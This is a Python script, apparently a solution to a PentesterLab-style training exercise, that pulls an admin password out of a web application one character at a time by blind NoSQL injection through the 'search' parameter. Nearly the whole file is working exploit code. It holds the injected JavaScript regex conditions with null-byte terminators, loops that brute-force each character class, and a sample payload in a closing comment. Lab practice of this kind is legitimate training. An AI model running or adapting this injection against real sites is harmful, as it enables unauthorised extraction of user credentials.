import requests

ptl_url = "http://ptl-eb7cd0e0-778a277a.libcurl.so/"

page = requests.get(ptl_url)

keyset1 = "XXXXXXXX"
keyset2 = "XXXX"
keyset3 = "XXXX"
keyset4 = "XXXX"
keyset5 = "XXXXXXXXXXXX"
flag = ""
ending = ".*$/)%00"
blank_query = "?search=admin%27%20%26%26%20this.password%20%26%26%20this.password.match(/^"

def flagz(length):
  for x in length:
        global flag
        if flag == "": # if no entries for the flag
        #numbers test
          query = "?search=admin%27%20%26%26%20this.password%20%26%26%20this.password.match(/^{}".format("[0-9]")
          page = requests.get(ptl_url + query + ending)
          if "<a href=\"?search=admin\">admin</a>" in page.text:
            if page.status_code == requests.codes.ok:
              for i in range(0,10):
                  new_query = blank_query + str(i) + ending
                  page = requests.get(ptl_url + new_query)
                  if page.status_code == requests.codes.ok:
                    if "<a href=\"?search=admin\">admin</a>" in page.text:
                      flag += str(i) # add value to the password possibilities
          
          else:
            query = "?search=admin%27%20%26%26%20this.password%20%26%26%20this.password.match(/^{}".format("[a-z]")
            page = requests.get(ptl_url + query + ending)
            if "<a href=\"?search=admin\">admin</a>" in page.text:
              if page.status_code == requests.codes.ok:
                query = "?search=admin%27%20%26%26%20this.password%20%26%26%20this.password.match(/^{}".format("[a-m]")
                page = requests.get(ptl_url + query + ending)
                if "<a href=\"?search=admin\">admin</a>" in page.text:
                  if page.status_code == requests.codes.ok:
                    for i in range(ord('a'), ord('m') + 1 ):
                          new_query = blank_query + chr(i) + ending
                          page = requests.get(ptl_url + new_query)
                          if page.status_code == requests.codes.ok:
                            if "<a href=\"?search=admin\">admin</a>" in page.text:
                              flag += str(chr(i)) # add value to the password possibilities
                else:
                  query = "?search=admin%27%20%26%26%20this.password%20%26%26%20this.password.match(/^{}".format("[n-z]")
                  page = requests.get(ptl_url + query + ending)
                  if page.status_code == requests.codes.ok:
                    for i in range(ord('n'), ord('z') + 1 ):
                          new_query = blank_query + chr(i) + ending
                          page = requests.get(ptl_url + new_query)
                          if page.status_code == requests.codes.ok:
                            if "<a href=\"?search=admin\">admin</a>" in page.text:
                              flag += str(chr(i)) # add value to the password possibilities
                
        else: # flag has contents
          #numbers test
          query = "?search=admin%27%20%26%26%20this.password%20%26%26%20this.password.match(/^{}".format(flag + "[0-9]")
          page = requests.get(ptl_url + query + ending)
          if "<a href=\"?search=admin\">admin</a>" in page.text:
            if page.status_code == requests.codes.ok:
              for i in range(0,10):
                    new_query = blank_query + flag + str(i) + ending
                    page = requests.get(ptl_url + new_query)
                    if page.status_code == requests.codes.ok:
                      if "<a href=\"?search=admin\">admin</a>" in page.text:
                        flag += str(i) # add value to the password possibilities
          else:
            query = "?search=admin%27%20%26%26%20this.password%20%26%26%20this.password.match(/^{}{}".format(flag, "[a-z]")
            page = requests.get(ptl_url + query + ending)
            if "<a href=\"?search=admin\">admin</a>" in page.text:
              if page.status_code == requests.codes.ok:
                query = "?search=admin%27%20%26%26%20this.password%20%26%26%20this.password.match(/^{}{}".format(flag, "[a-m]")
                page = requests.get(ptl_url + query + ending)
                if "<a href=\"?search=admin\">admin</a>" in page.text:
                  if page.status_code == requests.codes.ok:
                    for i in range(ord('a'), ord('m') + 1 ):
                          new_query = blank_query + flag + chr(i) + ending
                          page = requests.get(ptl_url + new_query)
                          if page.status_code == requests.codes.ok:
                            if "<a href=\"?search=admin\">admin</a>" in page.text:
                              flag += str(chr(i)) # add value to the password possibilities
                else:
                  query = "?search=admin%27%20%26%26%20this.password%20%26%26%20this.password.match(/^{}{}".format(flag, "[n-z]")
                  page = requests.get(ptl_url + query + ending)
                  if page.status_code == requests.codes.ok:
                    for i in range(ord('n'), ord('z') + 1 ):
                          new_query = blank_query + flag + chr(i) + ending
                          page = requests.get(ptl_url + new_query)
                          if page.status_code == requests.codes.ok:
                            if "<a href=\"?search=admin\">admin</a>" in page.text:
                              flag += str(chr(i)) # add value to the password possibilities
        

if page.status_code == requests.codes.ok:
    flagz(keyset1)
    flag += "-"
    print(flag)
    flagz(keyset2)
    flag += "-"
    print(flag)
    flagz(keyset3)
    flag += "-"
    print(flag)
    flagz(keyset4)
    flag += "-"
    print(flag)
    flagz(keyset5)
    print(flag)






#print(html_parse.get_text())
# ?search=admin%27%20%26%26%20this.password%20%26%26%20this.password.match(/^5b31.*$/)%00'
